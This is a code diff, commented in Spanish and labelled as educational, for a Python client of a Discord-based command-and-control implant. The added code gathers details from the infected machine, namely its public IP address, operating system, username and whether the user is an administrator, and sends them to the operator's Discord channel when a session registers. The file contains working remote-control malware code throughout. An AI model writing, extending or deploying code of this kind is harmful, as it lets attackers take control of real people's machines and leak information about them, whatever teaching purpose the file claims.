@@ -5,10 +5,8 @@ Propósito educativo: Entender arquitectura C2 y cómo los atacantes usan plataf
 
 import os
 import io
-import base64
 import asyncio
 import discord
-from discord.ext import commands
 from datetime import datetime
 
 
@@ -35,19 +33,48 @@ class DiscordC2Client:
         async def on_message(message):
             if message.channel.id != self.channel_id:
                 return
-            if message.author == self.client.user:
+            # Ignorar todos los bots (incluye el bot atacante)
+            if message.author.bot:
                 return
             
             await self._handle_command(message)
     
     async def _register_session(self):
         """Registra nueva sesión con el C2"""
+        # Obtener info del sistema
+        import platform
+        import socket
+        import json
+        import urllib.request
+        
+        # IP pública
+        public_ip = 'unknown'
+        try:
+            with urllib.request.urlopen('https://api.ipify.org?format=json', timeout=5) as r:
+                public_ip = json.loads(r.read())['ip']
+        except:
+            pass
+        
+        # Info del usuario
+        username = os.getenv('USERNAME', 'unknown')
+        is_admin = False
+        try:
+            import ctypes
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except:
+            pass
+        
         embed = discord.Embed(
             title="Nueva sesión iniciada",
             description=f"ID: {self.session_id}",
             color=0x00ff00,
             timestamp=datetime.now()
         )
+        embed.add_field(name="IP Pública", value=public_ip, inline=True)
+        embed.add_field(name="Sistema", value=platform.platform(), inline=False)
+        embed.add_field(name="Usuario", value=username, inline=True)
+        embed.add_field(name="Admin", value="✅ Sí" if is_admin else "❌ No", inline=True)
+        
         channel = self.client.get_channel(self.channel_id)
         await channel.send(embed=embed)
     
